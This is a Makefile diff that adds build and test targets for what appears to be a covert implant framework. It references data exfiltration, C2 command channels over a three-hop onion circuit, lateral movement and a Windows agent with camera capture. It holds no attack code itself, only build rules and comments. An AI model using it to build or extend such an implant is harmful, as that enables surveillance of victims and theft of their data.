@@ -26,7 +26,7 @@ LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
 AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
            ../agent_windows/build/linux/cam_mock.o
 
-all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task
+all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit
 
 $(BUILD):
 	mkdir -p $(BUILD)
@@ -65,6 +65,18 @@ $(BUILD)/test_task: tests/test_task.c $(BUILD)/task.o $(BUILD)/sched.o $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/sched.o -o $@ \
 	  $(P2PLIB) $(C2OBJS) $(LATLIB)
 
+# 任务通道与已建立电路的 IO 绑定：长度前缀帧 + 双向 IV 计数 + seq 单调性
+# （c2_frame 把 IV 放线上、不跟踪计数器，重放防护只能由本层补）
+$(BUILD)/task_link.o: src/task_link.c include/exfil_task_link.h include/exfil_task.h | $(BUILD)
+	$(CC) $(CFLAGS) -c $< -o $@
+
+# 端到端：C2 命令经**真实洋葱电路**（3 跳真进程）下行 -> 落到植入体调度器
+# -> 回执原路返回。含篡改/错密钥/重放/超长声明取证。
+$(BUILD)/test_task_circuit: tests/test_task_circuit.c $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o $(P2PLIB) $(C2OBJS) $(LATLIB)
+	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/task_link.o \
+	  $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ \
+	  $(P2PLIB) $(C2OBJS) $(LATLIB)
+
 $(BUILD)/test_sched: tests/test_sched.c $(BUILD)/sched.o
 	$(CC) $(CFLAGS) $< $(BUILD)/sched.o -o $@
 
@@ -96,13 +108,14 @@ $(BUILD)/dump_task: tests/dump_task.c $(BUILD)/task.o $(BUILD)/sched.o $(P2PLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/task.o $(BUILD)/sched.o -o $@ \
 	  $(P2PLIB) $(C2OBJS) $(LATLIB)
 
-test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task
+test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
 	./$(BUILD)/test_exfil_circuit
 	./$(BUILD)/test_sched
 	./$(BUILD)/test_sched_gate
 	./$(BUILD)/test_task
+	./$(BUILD)/test_task_circuit
 
 inspect: all
 	@echo "== 21_exfil 公开符号 =="
